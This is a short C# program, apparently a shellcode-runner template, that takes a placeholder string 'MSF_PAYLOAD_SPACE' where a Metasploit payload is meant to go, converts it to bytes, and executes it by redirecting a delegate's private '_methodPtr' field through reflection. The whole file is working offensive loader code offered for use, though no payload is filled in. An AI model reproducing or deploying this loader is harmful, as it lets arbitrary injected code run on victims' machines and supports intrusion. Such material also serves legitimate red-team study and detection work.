using System;
using System.Reflection;

namespace Shellcode
{
	class MainClass
	{
	public delegate uint Ret1ArgDelegate(uint arg1);
	    static uint PlaceHolder1(uint arg1) { return 0; }
	        
	    unsafe static void Main(string[] args)
	    {
	    	string shellcode = "MSF_PAYLOAD_SPACE";
	    	byte[] asmBytes = new byte[shellcode.Length];
			for (int i = 0; i < shellcode.Length; i++)
			{
			    asmBytes[i] = Convert.ToByte(shellcode[i]);
			}
	        fixed(byte* startAddress = &asmBytes[0]) // Take the address of our x86 code
	        {
	            // Get the FieldInfo for "_methodPtr"
	            Type delType = typeof(Delegate);
	            FieldInfo _methodPtr = delType.GetField("_methodPtr", BindingFlags.NonPublic | BindingFlags.Instance);
	
	            // Set our delegate to our x86 code
	            Ret1ArgDelegate del = new Ret1ArgDelegate(PlaceHolder1);
	            _methodPtr.SetValue(del, (IntPtr)startAddress);
	
	            // Enjoy
	            uint n = (uint)0xdecafbad;
	            n = del(n);
	            Console.WriteLine("{0:x}", n);
	        }
	    }
	}
}
